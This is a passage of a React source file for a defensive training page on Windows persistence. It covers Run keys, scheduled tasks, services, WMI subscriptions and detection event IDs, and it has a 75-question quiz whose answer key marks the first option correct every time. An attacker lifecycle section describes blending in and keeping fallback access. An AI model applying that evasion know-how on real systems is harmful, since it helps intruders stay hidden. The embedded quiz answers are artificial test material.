import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  alpha,
  useTheme,
  useMediaQuery,
  Drawer,
  Fab,
  LinearProgress,
  Divider,
  Alert,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import SecurityIcon from "@mui/icons-material/Security";
import AutorenewIcon from "@mui/icons-material/Autorenew";
import StorageIcon from "@mui/icons-material/Storage";
import BuildIcon from "@mui/icons-material/Build";
import SearchIcon from "@mui/icons-material/Search";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import QuizIcon from "@mui/icons-material/Quiz";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import SchoolIcon from "@mui/icons-material/School";
import { Link, useNavigate } from "react-router-dom";

const theme = {
  primary: "#3b82f6",
  primaryLight: "#60a5fa",
  secondary: "#a5b4fc",
  accent: "#8b5cf6",
  success: "#10b981",
  warning: "#f59e0b",
  info: "#3b82f6",
  text: "#e2e8f0",
  textMuted: "#94a3b8",
  bgDark: "#0a0d18",
  bgCard: "#111424",
  bgNested: "#0c0f1c",
  border: "rgba(255,255,255,0.08)",
};

const sectionNavItems = [
  { id: "intro", label: "Introduction", icon: <AutorenewIcon /> },
  { id: "overview", label: "Overview", icon: <SecurityIcon /> },
  { id: "categories", label: "Categories", icon: <StorageIcon /> },
  { id: "common-locations", label: "Common Locations", icon: <SearchIcon /> },
  { id: "detection-logs", label: "Detection & Logs", icon: <BuildIcon /> },
  { id: "beginner-lab", label: "Beginner Lab", icon: <SchoolIcon /> },
  { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon /> },
];

const CodeBlock: React.FC<{ code: string; language?: string }> = ({
  code,
  language = "powershell",
}) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: "#121424",
        borderRadius: 2,
        position: "relative",
        my: 2,
        border: "1px solid rgba(59, 130, 246, 0.3)",
      }}
    >
      <Box sx={{ position: "absolute", top: 8, right: 8, display: "flex", gap: 1 }}>
        <Chip label={language} size="small" sx={{ bgcolor: "#3b82f6", color: "#0b1020" }} />
        <Tooltip title={copied ? "Copied!" : "Copy"}>
          <IconButton size="small" onClick={handleCopy} sx={{ color: "#e2e8f0" }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      <Box
        component="pre"
        sx={{
          m: 0,
          overflow: "auto",
          fontFamily: "monospace",
          fontSize: "0.85rem",
          color: "#e2e8f0",
          pt: 2,
        }}
      >
        {code}
      </Box>
    </Paper>
  );
};

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#3b82f6";

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Basics",
    question: "What is persistence in a security context?",
    options: [
      "Maintaining access after reboots or logoffs",
      "Escalating privileges on the same host",
      "Encrypting files for exfiltration",
      "Blocking all outbound traffic",
    ],
    correctAnswer: 0,
    explanation: "Persistence ensures access remains after system restarts or user logoffs.",
  },
  {
    id: 2,
    topic: "Registry",
    question: "Which registry key runs programs at user logon?",
    options: [
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "HKLM\\System\\CurrentControlSet\\Services",
      "HKLM\\Software\\Classes",
      "HKCU\\Software\\Policies",
    ],
    correctAnswer: 0,
    explanation: "HKCU Run executes for the current user at logon.",
  },
  {
    id: 3,
    topic: "Registry",
    question: "Which registry key runs programs for all users at logon?",
    options: [
      "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
      "HKLM\\Software\\Classes\\CLSID",
      "HKCU\\Environment",
    ],
    correctAnswer: 0,
    explanation: "HKLM Run applies to all users on the system.",
  },
  {
    id: 4,
    topic: "Registry",
    question: "RunOnce entries are typically used to:",
    options: [
      "Execute a command one time at next logon",
      "Run at every boot forever",
      "Disable Windows updates",
      "Set network firewall rules",
    ],
    correctAnswer: 0,
    explanation: "RunOnce keys trigger a single execution.",
  },
  {
    id: 5,
    topic: "Tasks",
    question: "Which mechanism schedules execution on a timer or trigger?",
    options: [
      "Scheduled Tasks",
      "Startup Folder",
      "Winlogon Shell",
      "AppInit_DLLs",
    ],
    correctAnswer: 0,
    explanation: "Scheduled Tasks can execute programs based on triggers.",
  },
  {
    id: 6,
    topic: "Tasks",
    question: "Which Security event ID indicates a scheduled task was created?",
    options: [
      "4698",
      "4688",
      "4624",
      "4776",
    ],
    correctAnswer: 0,
    explanation: "Event 4698 records scheduled task creation.",
  },
  {
    id: 7,
    topic: "Services",
    question: "Why are Windows services a common persistence method?",
    options: [
      "They can start automatically with SYSTEM privileges",
      "They only run once and then exit",
      "They cannot be detected by logging",
      "They require no configuration",
    ],
    correctAnswer: 0,
    explanation: "Services can run at boot with high privileges.",
  },
  {
    id: 8,
    topic: "Services",
    question: "Which event ID indicates a new service was installed?",
    options: [
      "4697",
      "4625",
      "4720",
      "1102",
    ],
    correctAnswer: 0,
    explanation: "Event 4697 logs service installation.",
  },
  {
    id: 9,
    topic: "Services",
    question: "Which event ID indicates a service was created on the system log?",
    options: [
      "7045",
      "4624",
      "4688",
      "5156",
    ],
    correctAnswer: 0,
    explanation: "Event 7045 records service creation in System logs.",
  },
  {
    id: 10,
    topic: "Startup",
    question: "The Startup folder is used to:",
    options: [
      "Run programs when a user logs in",
      "Run processes only during shutdown",
      "Store system drivers",
      "Control Windows Update settings",
    ],
    correctAnswer: 0,
    explanation: "Startup folder items execute at user logon.",
  },
  {
    id: 11,
    topic: "WMI",
    question: "WMI Event Subscriptions consist of:",
    options: [
      "EventFilter, EventConsumer, and FilterToConsumerBinding",
      "Registry Run and RunOnce keys",
      "Services and Drivers only",
      "Startup folders and shortcuts",
    ],
    correctAnswer: 0,
    explanation: "WMI persistence uses filters, consumers, and bindings.",
  },
  {
    id: 12,
    topic: "WMI",
    question: "Why is WMI persistence considered stealthy?",
    options: [
      "It can be fileless and stored in the WMI repository",
      "It disables all system logging",
      "It always runs as SYSTEM without traces",
      "It cannot be enumerated",
    ],
    correctAnswer: 0,
    explanation: "WMI persistence often avoids obvious files on disk.",
  },
  {
    id: 13,
    topic: "Winlogon",
    question: "Which registry location controls Winlogon shell settings?",
    options: [
      "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "HKLM\\System\\CurrentControlSet\\Services",
      "HKCU\\Control Panel\\Desktop",
    ],
    correctAnswer: 0,
    explanation: "Winlogon settings live under the Windows NT Winlogon key.",
  },
  {
    id: 14,
    topic: "Winlogon",
    question: "The default Userinit value typically includes:",
    options: [
      "userinit.exe",
      "svchost.exe",
      "explorer.exe",
      "lsass.exe",
    ],
    correctAnswer: 0,
    explanation: "Userinit should normally point to userinit.exe.",
  },
  {
    id: 15,
    topic: "LSA",
    question: "LSA persistence commonly involves modifying:",
    options: [
      "Authentication packages or security providers",
      "Firewall rules only",
      "Windows Update settings",
      "DNS server configuration",
    ],
    correctAnswer: 0,
    explanation: "LSA settings can load authentication packages at boot.",
  },
  {
    id: 16,
    topic: "AppInit",
    question: "AppInit_DLLs persistence relies on:",
    options: [
      "Loading DLLs into user-mode processes on startup",
      "Creating a new Windows service",
      "Running a task once at logon",
      "Disabling UAC prompts",
    ],
    correctAnswer: 0,
    explanation: "AppInit_DLLs can load DLLs into many processes.",
  },
  {
    id: 17,
    topic: "IFEO",
    question: "Image File Execution Options (IFEO) can be abused by:",
    options: [
      "Setting a debugger for a target executable",
      "Enabling full disk encryption",
      "Creating new local users",
      "Disabling Windows Defender",
    ],
    correctAnswer: 0,
    explanation: "IFEO allows specifying a debugger executable to run instead.",
  },
  {
    id: 18,
    topic: "GPO",
    question: "Why can logon scripts via GPO be used for persistence?",
    options: [
      "They run at user logon across many systems",
      "They only run once and delete themselves",
      "They cannot be modified by admins",
      "They disable logging automatically",
    ],
    correctAnswer: 0,
    explanation: "GPO scripts can run on many systems at logon.",
  },
  {
    id: 19,
    topic: "Detection",
    question: "Which event ID captures process creation in Windows Security logs?",
    options: [
      "4688",
      "4698",
      "4672",
      "4771",
    ],
    correctAnswer: 0,
    explanation: "Event 4688 logs process creation.",
  },
  {
    id: 20,
    topic: "Detection",
    question: "Sysmon Event ID 13 records:",
    options: [
      "Registry value set events",
      "Process creation",
      "Network connections",
      "Driver loading",
    ],
    correctAnswer: 0,
    explanation: "Sysmon 13 captures registry modifications.",
  },
  {
    id: 21,
    topic: "Detection",
    question: "Which tool is commonly used to enumerate persistence points?",
    options: [
      "Autoruns",
      "ipconfig",
      "nslookup",
      "taskkill",
    ],
    correctAnswer: 0,
    explanation: "Autoruns lists startup entries, services, tasks, and more.",
  },
  {
    id: 22,
    topic: "Tasks",
    question: "Which command lists scheduled tasks from the CLI?",
    options: [
      "schtasks /query",
      "sc query",
      "net use",
      "whoami /priv",
    ],
    correctAnswer: 0,
    explanation: "schtasks /query enumerates scheduled tasks.",
  },
  {
    id: 23,
    topic: "Services",
    question: "Which command lists services from the CLI?",
    options: [
      "sc query",
      "net user",
      "reg query",
      "driverquery",
    ],
    correctAnswer: 0,
    explanation: "sc query enumerates service status and configuration.",
  },
  {
    id: 24,
    topic: "Registry",
    question: "Why are per-user Run keys attractive to attackers?",
    options: [
      "They often require no admin privileges",
      "They run only on server editions",
      "They disable antivirus",
      "They always trigger SYSTEM privileges",
    ],
    correctAnswer: 0,
    explanation: "HKCU Run can be modified by the user without elevation.",
  },
  {
    id: 25,
    topic: "Registry",
    question: "Why are HKLM Run keys higher impact?",
    options: [
      "They affect all users on the system",
      "They are hidden from admins",
      "They only run once",
      "They are required for OS updates",
    ],
    correctAnswer: 0,
    explanation: "HKLM Run applies to every user that logs in.",
  },
  {
    id: 26,
    topic: "Tasks",
    question: "Which is a suspicious scheduled task behavior?",
    options: [
      "A task running from a temp directory",
      "A task created by IT for updates",
      "A task signed by Microsoft",
      "A task aligned with normal patch windows",
    ],
    correctAnswer: 0,
    explanation: "Tasks running from temp or user-writable paths are suspicious.",
  },
  {
    id: 27,
    topic: "Services",
    question: "Why are services pointing to user-writable paths risky?",
    options: [
      "Attackers can replace the service binary",
      "They disable event logging",
      "They prevent restarts",
      "They are required for updates",
    ],
    correctAnswer: 0,
    explanation: "Writable paths enable binary replacement for persistence.",
  },
  {
    id: 28,
    topic: "Startup",
    question: "Which file type is commonly used in Startup folders?",
    options: [
      "Shortcut (.lnk)",
      "Kernel driver (.sys)",
      "Registry hive (.dat)",
      "Event log (.evtx)",
    ],
    correctAnswer: 0,
    explanation: "Shortcuts are typical in Startup folders.",
  },
  {
    id: 29,
    topic: "WMI",
    question: "Which area should be checked for WMI persistence?",
    options: [
      "ROOT\\Subscription namespace",
      "HKCU\\Run",
      "Task Scheduler Library only",
      "Startup folder only",
    ],
    correctAnswer: 0,
    explanation: "WMI subscriptions are stored in ROOT\\Subscription.",
  },
  {
    id: 30,
    topic: "AppInit",
    question: "What setting must often be enabled for AppInit_DLLs to load?",
    options: [
      "LoadAppInit_DLLs",
      "SafeDllSearchMode",
      "EnableLUA",
      "DisableCMD",
    ],
    correctAnswer: 0,
    explanation: "LoadAppInit_DLLs controls whether AppInit DLLs load.",
  },
  {
    id: 31,
    topic: "IFEO",
    question: "IFEO persistence typically affects:",
    options: [
      "Specific targeted executables",
      "All system services at boot",
      "All user logons",
      "Only kernel drivers",
    ],
    correctAnswer: 0,
    explanation: "IFEO applies to specific named executables.",
  },
  {
    id: 32,
    topic: "Detection",
    question: "Which Sysmon event is useful for image load monitoring?",
    options: [
      "Event ID 7",
      "Event ID 1",
      "Event ID 3",
      "Event ID 13",
    ],
    correctAnswer: 0,
    explanation: "Sysmon 7 captures DLL and image loads.",
  },
  {
    id: 33,
    topic: "Detection",
    question: "Which tool can validate file signatures on Windows?",
    options: [
      "sigcheck",
      "nslookup",
      "netsh",
      "fsutil",
    ],
    correctAnswer: 0,
    explanation: "sigcheck verifies signatures and file metadata.",
  },
  {
    id: 34,
    topic: "GPO",
    question: "Why is SYSVOL relevant to persistence?",
    options: [
      "GPO scripts are stored and distributed from SYSVOL",
      "It stores local user passwords",
      "It disables auditing",
      "It contains OS binaries",
    ],
    correctAnswer: 0,
    explanation: "GPO scripts in SYSVOL can run across systems.",
  },
  {
    id: 35,
    topic: "Hardening",
    question: "What is a key hardening step for persistence?",
    options: [
      "Restrict write permissions to Run keys and task folders",
      "Disable all event logs",
      "Allow unsigned drivers",
      "Remove UAC completely",
    ],
    correctAnswer: 0,
    explanation: "Tight permissions reduce the ability to plant persistence.",
  },
  {
    id: 36,
    topic: "Hardening",
    question: "Why enforce least privilege?",
    options: [
      "It limits who can create services and tasks",
      "It increases patch frequency",
      "It disables all scripts",
      "It removes network segmentation",
    ],
    correctAnswer: 0,
    explanation: "Least privilege reduces who can create persistence.",
  },
  {
    id: 37,
    topic: "Hardening",
    question: "Why baseline autorun entries?",
    options: [
      "To detect new or unexpected persistence",
      "To disable all autoruns",
      "To prevent reboots",
      "To increase CPU usage",
    ],
    correctAnswer: 0,
    explanation: "Baselines make change detection easier.",
  },
  {
    id: 38,
    topic: "Hardening",
    question: "Why enable command-line logging?",
    options: [
      "It captures arguments used to create persistence",
      "It prevents process creation",
      "It disables scripts",
      "It removes registry entries",
    ],
    correctAnswer: 0,
    explanation: "Command lines show how persistence was configured.",
  },
  {
    id: 39,
    topic: "Registry",
    question: "COM hijacking typically abuses:",
    options: [
      "HKCU\\Software\\Classes\\CLSID entries",
      "HKLM\\System\\CurrentControlSet\\Services",
      "Startup folders",
      "Task Scheduler history",
    ],
    correctAnswer: 0,
    explanation: "COM registrations can be hijacked in user or system hives.",
  },
  {
    id: 40,
    topic: "Tasks",
    question: "Why are tasks set to run as SYSTEM high risk?",
    options: [
      "They execute with elevated privileges",
      "They cannot be deleted",
      "They run only once",
      "They have no logs",
    ],
    correctAnswer: 0,
    explanation: "SYSTEM tasks run with the highest local privileges.",
  },
  {
    id: 41,
    topic: "Services",
    question: "A suspicious service ImagePath often points to:",
    options: [
      "User-writable or temp locations",
      "C:\\Windows\\System32",
      "Program Files with signed binaries",
      "DriverStore",
    ],
    correctAnswer: 0,
    explanation: "Unusual paths are common in malicious services.",
  },
  {
    id: 42,
    topic: "WMI",
    question: "How can WMI persistence be detected?",
    options: [
      "Querying WMI subscriptions and auditing WMI events",
      "Only checking Startup folders",
      "Disabling Sysmon",
      "Removing all scheduled tasks",
    ],
    correctAnswer: 0,
    explanation: "WMI subscriptions can be enumerated and monitored.",
  },
  {
    id: 43,
    topic: "Detection",
    question: "Why monitor registry key changes under Run and RunOnce?",
    options: [
      "They are common persistence locations",
      "They only store benign settings",
      "They are unrelated to persistence",
      "They contain system passwords",
    ],
    correctAnswer: 0,
    explanation: "Run keys are frequently abused for persistence.",
  },
  {
    id: 44,
    topic: "Detection",
    question: "Which log helps identify task execution and changes?",
    options: [
      "Microsoft-Windows-TaskScheduler/Operational",
      "DNS Server logs",
      "Print Service logs",
      "Boot Configuration logs",
    ],
    correctAnswer: 0,
    explanation: "Task Scheduler logs record creation and execution.",
  },
  {
    id: 45,
    topic: "Detection",
    question: "Why are unsigned binaries in autoruns suspicious?",
    options: [
      "They may indicate untrusted or tampered executables",
      "They are required for Windows updates",
      "They are always benign",
      "They prevent booting",
    ],
    correctAnswer: 0,
    explanation: "Unsigned binaries deserve review for legitimacy.",
  },
  {
    id: 46,
    topic: "Registry",
    question: "Which command-line tool can add or edit Run keys?",
    options: [
      "reg add",
      "net use",
      "arp",
      "route",
    ],
    correctAnswer: 0,
    explanation: "reg add modifies registry values from the CLI.",
  },
  {
    id: 47,
    topic: "Tasks",
    question: "Which command-line tool can create scheduled tasks?",
    options: [
      "schtasks /create",
      "sc stop",
      "wmic qfe",
      "ipconfig",
    ],
    correctAnswer: 0,
    explanation: "schtasks /create defines a new scheduled task.",
  },
  {
    id: 48,
    topic: "Services",
    question: "Which command-line tool can create services?",
    options: [
      "sc create",
      "tasklist",
      "whoami",
      "netstat",
    ],
    correctAnswer: 0,
    explanation: "sc create registers a new service.",
  },
  {
    id: 49,
    topic: "Startup",
    question: "Why check both per-user and all-user Startup folders?",
    options: [
      "Persistence can be placed in either location",
      "Only per-user folders exist",
      "Only all-user folders exist",
      "Startup folders are unused",
    ],
    correctAnswer: 0,
    explanation: "Both locations can contain startup items.",
  },
  {
    id: 50,
    topic: "Winlogon",
    question: "What is suspicious about Winlogon shell changes?",
    options: [
      "The shell should normally be explorer.exe",
      "Winlogon shell is always empty",
      "Shell changes are required for updates",
      "Shell changes disable logging",
    ],
    correctAnswer: 0,
    explanation: "Winlogon shell changes can launch malicious programs.",
  },
  {
    id: 51,
    topic: "LSA",
    question: "Why are unexpected LSA packages suspicious?",
    options: [
      "They can load at boot and capture credentials",
      "They are required for DNS resolution",
      "They are always signed by Microsoft",
      "They only run after shutdown",
    ],
    correctAnswer: 0,
    explanation: "LSA packages can intercept authentication data.",
  },
  {
    id: 52,
    topic: "Registry",
    question: "Which key is often used for legacy logon scripts?",
    options: [
      "UserInitMprLogonScript",
      "SafeBoot",
      "Winlogon\\Shell",
      "Services\\Parameters",
    ],
    correctAnswer: 0,
    explanation: "UserInitMprLogonScript can run scripts at logon.",
  },
  {
    id: 53,
    topic: "Hardening",
    question: "Why should scheduled task creation be restricted?",
    options: [
      "It reduces the number of users who can set persistence",
      "It disables Windows Update",
      "It prevents antivirus from running",
      "It increases memory usage",
    ],
    correctAnswer: 0,
    explanation: "Restricting task creation reduces persistence opportunities.",
  },
  {
    id: 54,
    topic: "Hardening",
    question: "Why is code signing policy helpful?",
    options: [
      "It helps ensure only trusted code runs",
      "It disables all PowerShell",
      "It blocks all registry writes",
      "It eliminates the need for monitoring",
    ],
    correctAnswer: 0,
    explanation: "Signing policies can block unknown or tampered code.",
  },
  {
    id: 55,
    topic: "Detection",
    question: "Which indicator suggests malicious persistence?",
    options: [
      "Randomized task or service names with odd paths",
      "Well-documented vendor services",
      "Signed Microsoft binaries",
      "Tasks created by IT change windows",
    ],
    correctAnswer: 0,
    explanation: "Random names and unusual paths often indicate malware.",
  },
  {
    id: 56,
    topic: "Detection",
    question: "Why monitor for registry writes to Winlogon?",
    options: [
      "It is a critical persistence location",
      "It only stores display settings",
      "It is unrelated to logon behavior",
      "It contains Wi-Fi passwords",
    ],
    correctAnswer: 0,
    explanation: "Winlogon settings can control logon behaviors.",
  },
  {
    id: 57,
    topic: "Tasks",
    question: "A task that triggers at logon is used to:",
    options: [
      "Run a program whenever a user signs in",
      "Run only once during installation",
      "Run only at shutdown",
      "Disable system updates",
    ],
    correctAnswer: 0,
    explanation: "Logon triggers execute whenever a user logs in.",
  },
  {
    id: 58,
    topic: "Services",
    question: "Why should service accounts be least privilege?",
    options: [
      "To reduce impact if the service is abused for persistence",
      "To stop the service from running",
      "To remove event logging",
      "To avoid patching",
    ],
    correctAnswer: 0,
    explanation: "Least privilege limits damage if the service is compromised.",
  },
  {
    id: 59,
    topic: "Detection",
    question: "Which log source helps detect registry persistence?",
    options: [
      "Sysmon with registry auditing",
      "DNS server logs only",
      "Printer logs only",
      "BIOS logs only",
    ],
    correctAnswer: 0,
    explanation: "Registry auditing captures changes to Run keys and other locations.",
  },
  {
    id: 60,
    topic: "Basics",
    question: "Which of the following is NOT a common persistence method?",
    options: [
      "Changing desktop wallpaper",
      "Scheduled Tasks",
      "Run keys",
      "Services",
    ],
    correctAnswer: 0,
    explanation: "Wallpaper changes are not persistence mechanisms.",
  },
  {
    id: 61,
    topic: "Hardening",
    question: "Why enable tamper protection and EDR alerts?",
    options: [
      "To detect changes to persistence locations",
      "To remove all user accounts",
      "To disable update checks",
      "To increase download speeds",
    ],
    correctAnswer: 0,
    explanation: "EDR can monitor and alert on persistence behaviors.",
  },
  {
    id: 62,
    topic: "Hardening",
    question: "Why review startup entries during incident response?",
    options: [
      "Persistence may remain after initial cleanup",
      "Startup entries are always benign",
      "They have no impact on systems",
      "They prevent updates",
    ],
    correctAnswer: 0,
    explanation: "Persistence often survives unless explicitly removed.",
  },
  {
    id: 63,
    topic: "Registry",
    question: "Which tool is useful for reading registry persistence keys?",
    options: [
      "reg query",
      "ipconfig",
      "tracert",
      "route",
    ],
    correctAnswer: 0,
    explanation: "reg query reads registry keys from the CLI.",
  },
  {
    id: 64,
    topic: "Detection",
    question: "What is a red flag for persistence review?",
    options: [
      "Startup entries pointing to user temp folders",
      "Signed vendor update tasks",
      "Services under Program Files",
      "Known security agent tasks",
    ],
    correctAnswer: 0,
    explanation: "Temp folder paths are common for malicious persistence.",
  },
  {
    id: 65,
    topic: "Basics",
    question: "Why is persistence important for attackers?",
    options: [
      "It allows long-term access and reentry",
      "It guarantees zero detection",
      "It automatically provides domain admin",
      "It bypasses patching",
    ],
    correctAnswer: 0,
    explanation: "Persistence enables long-term access to a target.",
  },
  {
    id: 66,
    topic: "Registry",
    question: "What is a key risk with writable Run keys?",
    options: [
      "Attackers can add executables for logon execution",
      "They increase system boot time only",
      "They prevent logon entirely",
      "They disable antivirus",
    ],
    correctAnswer: 0,
    explanation: "Writable Run keys enable stealthy autostart.",
  },
  {
    id: 67,
    topic: "WMI",
    question: "Which tool can enumerate WMI subscriptions?",
    options: [
      "PowerShell WMI cmdlets",
      "nslookup",
      "arp",
      "ping",
    ],
    correctAnswer: 0,
    explanation: "WMI cmdlets can query EventFilter and Consumer objects.",
  },
  {
    id: 68,
    topic: "Services",
    question: "Why is service recovery configuration relevant?",
    options: [
      "It can restart a malicious service automatically",
      "It disables all services",
      "It encrypts service binaries",
      "It updates Windows Defender",
    ],
    correctAnswer: 0,
    explanation: "Recovery actions can keep a malicious service running.",
  },
  {
    id: 69,
    topic: "Detection",
    question: "Which data helps confirm suspicious persistence?",
    options: [
      "Command-line arguments and file hashes",
      "Only user full names",
      "Only system uptime",
      "Only DNS records",
    ],
    correctAnswer: 0,
    explanation: "Command lines and hashes help validate suspicious entries.",
  },
  {
    id: 70,
    topic: "Hardening",
    question: "Why should administrators review new services and tasks?",
    options: [
      "To catch unauthorized persistence quickly",
      "To speed up boots",
      "To reduce logging",
      "To disable backups",
    ],
    correctAnswer: 0,
    explanation: "Rapid review shortens dwell time for persistence.",
  },
  {
    id: 71,
    topic: "Basics",
    question: "Which category is an example of persistence?",
    options: [
      "Creating a scheduled task at logon",
      "Running a one-time command in PowerShell",
      "Performing a ping sweep",
      "Viewing event logs",
    ],
    correctAnswer: 0,
    explanation: "Scheduled tasks at logon provide repeat execution.",
  },
  {
    id: 72,
    topic: "Detection",
    question: "Why check the startup approved registry keys?",
    options: [
      "They indicate whether startup items are enabled",
      "They store password hashes",
      "They track network routes",
      "They control DNS settings",
    ],
    correctAnswer: 0,
    explanation: "Startup approved keys show enabled startup entries.",
  },
  {
    id: 73,
    topic: "Hardening",
    question: "Why remove stale admin accounts?",
    options: [
      "They can be used to create persistence unchecked",
      "They speed up logon",
      "They improve network throughput",
      "They enable automatic backups",
    ],
    correctAnswer: 0,
    explanation: "Unused admin accounts can be abused to maintain persistence.",
  },
  {
    id: 74,
    topic: "Registry",
    question: "What is the risk of a modified Winlogon Userinit value?",
    options: [
      "It can execute malware at logon",
      "It only changes wallpaper",
      "It disables updates",
      "It affects DNS settings only",
    ],
    correctAnswer: 0,
    explanation: "Userinit modifications can run malicious programs at logon.",
  },
  {
    id: 75,
    topic: "Hardening",
    question: "What is a strong response action for persistence?",
    options: [
      "Remove the entry and remediate the root cause",
      "Ignore and monitor only",
      "Disable all logs",
      "Reboot and assume it is gone",
    ],
    correctAnswer: 0,
    explanation: "Persistence must be removed and the cause fixed.",
  },
];

const WindowsPersistenceMechanismsPage: React.FC = () => {
  const navigate = useNavigate();

  const pageContext = `This page covers Windows persistence mechanisms used by attackers to maintain access after initial compromise. Categories include Registry Run Keys, Scheduled Tasks, Services, Startup Folders, WMI Event Subscriptions, Winlogon and LSA, Logon Scripts and GPO, and AppInit/DLL Search Order hijacking. Common locations covered: HKCU/HKLM Run keys, Task Scheduler Library, Windows Services, Startup folders, WMI EventFilter/Consumer, Winlogon shell/userinit, and AppInit_DLLs. The page includes a persistence lifecycle model, MITRE ATT&CK mappings, triage prompts, risky path guidance, detection signals, useful Windows Event IDs (4688, 4697, 4698, 7045, Sysmon 1/13), hardening checklists, safe enumeration commands, and beginner lab exercises.`;

  const objectives = [
    "Explain persistence in plain language and why it matters.",
    "List the most common Windows persistence locations.",
    "Safely enumerate persistence artifacts in a lab.",
    "Recognize basic detection signals and logs.",
    "Document findings with clear evidence and fixes.",
  ];
  const beginnerPath = [
    "1) Read the glossary so the terms make sense.",
    "2) Identify the main persistence categories (Run keys, services, tasks).",
    "3) Run the safe commands and save outputs to a notes file.",
    "4) Pick one artifact and explain why it is expected or suspicious.",
    "5) Write a short recommendation or detection idea.",
  ];
  const misconceptions = [
    {
      myth: "Persistence always means malware is installed.",
      reality: "Attackers can use legitimate Windows features to stay resident.",
    },
    {
      myth: "Disabling one tool stops persistence.",
      reality: "There are many persistence methods, so layered controls matter.",
    },
    {
      myth: "If it is in the registry, it is malicious.",
      reality: "Most Run keys are legitimate; context and location matter.",
    },
  ];

  const glossary = [
    { term: "Persistence", desc: "How an attacker stays on a system after initial access." },
    { term: "Run key", desc: "Registry locations that launch programs at user logon." },
    { term: "Service", desc: "Background process that starts with Windows or on demand." },
    { term: "Scheduled task", desc: "A job that runs on a schedule or trigger." },
    { term: "Startup folder", desc: "Folder that launches shortcuts at login." },
    { term: "WMI event", desc: "Automation trigger that can run scripts on events." },
  ];

  const persistenceCategories = [
    {
      title: "Registry Run Keys",
      desc: "Programs configured to start when a user logs in.",
      examples: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    },
    {
      title: "Scheduled Tasks",
      desc: "Jobs that run at logon, startup, or on a timer.",
      examples: "Task Scheduler library",
    },
    {
      title: "Services",
      desc: "Background services that start with Windows.",
      examples: "Service Control Manager",
    },
    {
      title: "Startup Folders",
      desc: "Shortcuts or scripts that run at logon.",
      examples: "Startup folder (All Users or User)",
    },
    {
      title: "WMI Event Subscriptions",
      desc: "Event-based triggers that run scripts or commands.",
      examples: "Permanent event subscriptions",
    },
    {
      title: "Winlogon and LSA",
      desc: "Authentication and logon components that can be extended.",
      examples: "Winlogon notify, LSA providers",
    },
    {
      title: "Logon Scripts and GPO",
      desc: "Scripts configured by policy or local settings at logon.",
      examples: "User logon scripts, Group Policy",
    },
    {
      title: "AppInit and DLL Search Order",
      desc: "DLL loading behavior that can run code in trusted processes.",
      examples: "AppInit_DLLs, hijacked DLL names",
    },
  ];

  const commonLocations = [
    {
      location: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      purpose: "Run at current user logon",
      signal: "New entries pointing to user-writable paths",
    },
    {
      location: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      purpose: "Run at system logon",
      signal: "Unsigned binaries in system-wide keys",
    },
    {
      location: "HKLM\\System\\CurrentControlSet\\Services",
      purpose: "Windows services",
      signal: "New services with odd display names or paths",
    },
    {
      location: "Task Scheduler Library",
      purpose: "Scheduled tasks",
      signal: "Tasks created by non-admin users",
    },
    {
      location: "Startup Folders",
      purpose: "Logon startup shortcuts",
      signal: "Shortcuts pointing to temp directories",
    },
    {
      location: "WMI\\EventFilter / Consumer",
      purpose: "WMI persistence",
      signal: "Filters and consumers created recently",
    },
    {
      location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
      purpose: "Winlogon extensions",
      signal: "Unexpected shell or userinit values",
    },
    {
      location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
      purpose: "AppInit DLL loading",
      signal: "Non-Microsoft DLLs in AppInit",
    },
  ];

  const detectionSignals = [
    "New scheduled task with an unusual name or trigger.",
    "Service binary stored in a user profile or temp folder.",
    "Run key entry pointing to a script in Downloads.",
    "WMI subscriptions created by standard user accounts.",
    "Startup shortcuts with non-standard targets.",
    "Winlogon shell or userinit values modified.",
    "AppInit_DLLs populated with non-standard DLLs.",
    "Logon scripts added outside of admin change windows.",
  ];

  const persistenceLifecycle = [
    {
      title: "Establish",
      desc: "Create a trigger that executes after logon, boot, or an event.",
      example: "Run keys, scheduled tasks, or services.",
    },
    {
      title: "Validate",
      desc: "Confirm it runs as expected and survives a reboot.",
      example: "Task history shows execution, service starts cleanly.",
    },
    {
      title: "Blend",
      desc: "Reduce visibility by using plausible names and locations.",
      example: "Vendor-like task names and signed binaries.",
    },
    {
      title: "Fallback",
      desc: "Maintain secondary access if the first method is removed.",
      example: "Backup run key or secondary task.",
    },
  ];

  const telemetryLayers = [
    {
      layer: "Process and module telemetry",
      focus: "Process creation, command lines, and module loads.",
      sources: "Security 4688, Sysmon 1/7, EDR telemetry.",
    },
    {
      layer: "Registry and configuration",
      focus: "Run keys, Winlogon, LSA, and AppInit changes.",
